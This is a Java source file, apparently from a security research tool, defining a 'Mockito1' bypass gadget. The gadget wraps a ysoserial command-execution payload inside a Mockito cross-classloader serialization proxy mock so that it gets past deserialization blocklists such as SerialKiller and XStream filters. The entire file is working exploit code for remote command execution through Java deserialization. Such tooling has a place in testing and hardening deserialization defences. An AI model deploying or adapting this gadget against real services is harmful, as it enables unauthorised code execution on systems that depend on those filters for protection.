package serialkiller.bypass;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import java.io.*;
import java.lang.reflect.Constructor;
import static org.mockito.Mockito.*;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "org.mockito:mockito-all:1.1"} )
public class Mockito1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);

        // Build a Mock since the CrossClassLoaderSerializationProxy only accepts mocks
        // ByteBuddyCrossClassLoaderSerializationSupport is not public on org.mockito.internal.creation.bytebuddy
        Class<?> c = Class.forName("org.mockito.internal.creation.bytebuddy.ByteBuddyCrossClassLoaderSerializationSupport$CrossClassLoaderSerializationProxy");
        Constructor<?> constructor = c.getConstructor(Object.class);
        constructor.setAccessible(true);
        Object mock = constructor.newInstance(mock(Serializable.class));
        // At this point the serializedMock is not useful, replace it with our payload
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        // But we need to annotate the stream with a non-mock marker
        MyMockitoMockObjectOutputStream objOut = new MyMockitoMockObjectOutputStream(out);
        objOut.writeObject(payload);
        byte[] payload_bytes = out.toByteArray();
        // Set the new payload as the serializedMock byte array
        Reflections.setFieldValue(mock, "serializedMock", payload_bytes);

        return mock;
    }

    public class MyMockitoMockObjectOutputStream extends ObjectOutputStream {
        private static final String NOTHING = "";

        public MyMockitoMockObjectOutputStream(ByteArrayOutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            writeObject(mockitoProxyClassMarker(cl));
        }

        private String mockitoProxyClassMarker(Class<?> cl) {
            return NOTHING;
        }
    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}





